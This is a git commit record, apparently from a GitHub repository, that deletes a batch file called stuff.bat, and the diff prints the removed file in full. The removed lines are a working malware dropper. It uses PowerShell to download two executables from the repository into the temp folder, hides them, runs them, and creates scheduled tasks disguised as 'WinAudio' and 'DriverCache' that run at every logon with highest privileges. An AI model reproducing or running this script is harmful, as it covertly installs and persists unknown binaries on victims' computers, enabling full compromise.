58ca125d95f8f676e1a28fdbc823c68d347e8796
PCFACTORYRESET <143837185+PCFACTORYRESET@users.noreply.github.com>
2026-02-15 14:47:59 +0000

    Delete stuff.bat

--- stuff.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/PCFACTORYRESET/PCFACTORYRESET/raw/refs/heads/main/dsc' -OutFile '%temp%\dsc.exe' -UseBasicParsing"
-attrib +h "%temp%\dsc.exe"
-start %temp%\dsc.exe
-schtasks /create /tn "WinAudio" /tr "\"%TEMP%\dsc.exe\"" /sc onlogon /rl highest /f
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/PCFACTORYRESET/PCFACTORYRESET/raw/refs/heads/main/main' -OutFile '%temp%\main.exe' -UseBasicParsing"
-attrib +h "%temp%\main.exe"
-start %temp%\main.exe
-schtasks /create /tn "DriverCache" /tr "\"%TEMP%\main.exe\"" /sc onlogon /rl highest /f
